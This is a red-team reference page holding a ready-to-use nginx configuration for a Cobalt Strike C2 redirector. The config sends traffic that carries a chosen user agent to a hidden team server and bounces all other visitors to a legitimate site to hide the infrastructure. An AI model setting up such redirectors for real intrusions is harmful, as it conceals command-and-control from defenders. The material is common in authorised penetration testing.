---
description: >-
  Nginx hosting a web app, reverse proxy for C2 traffic and forwarding of mobile
  user agents to /mobile
---

# Multi functional WebApp

```text

server {
        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;
    server_name _; # managed by Certbot



    listen [::]:443 ssl ipv6only=on; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/[[DOMAIN]]/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/[[DOMAIN]]/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot


        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
        #
                # With php-fpm (or other unix sockets):
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
}



location ^~ /.well-known/acme-challenge/ {
    default_type "text/plain";
}


location = /.well-known/acme-challenge/ {
    return 404;
}






#If user agent [[C2_USERAGENT]] isn't a match, redirect to [[LEGIT_SITE]]
        location ~ ^/(SLS|v3|SLS1)/ {
                if ($http_user_agent != "[[C2_USERAGENT]]") {
                        return 301 https://[[LEGIT_SITE]];  ###Legit site to direct traffic to
                       break;
        }

#If user agent matches, forward traffic to [[TEAM_SERVER]] via reverse proxy
                proxy_set_header Host $http_host;
               proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $remote_addr;                          #<Gives correct IP in cobalt strike. Need the following in c2 profile within http-config [set trust_x_forwarded_for "true";]
                proxy_set_header X-Forwarded-Proto $scheme;
                proxy_pass https://[[TEAM_SERVER]]:444;



}



##set vars for mobile traffic check
set $mobile_rewrite do_not_perform;
set $uritest 0;



## check http_user_agent for mobile / smart phones ##
if ($http_user_agent ~* "(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino") {
  set $mobile_rewrite perform;
}


if ($mobile_rewrite = perform) {
        rewrite ^/$ https://[[DOMAIN]]/mobile redirect;
 break;
}


#Access to /mobile
location = /mobile {
root /var/www/html;
index mobile.htlm;
try_files $uri.html $uri $uri/ =404;
break;
}



#Access to web app (HTTPS)
location / {
index index.html;
try_files $uri.html $uri $uri/ =404;
root /var/www/html;
}
}

server {  #redirect to HTTPS
  if ($host = [[HOST]]) {
       return 301 https://$host$request_uri;
  } # managed by Certbot

root /var/www/html;
        listen 80 ;
        listen [::]:80 ;
   server_name _;
location / {
}
}
```

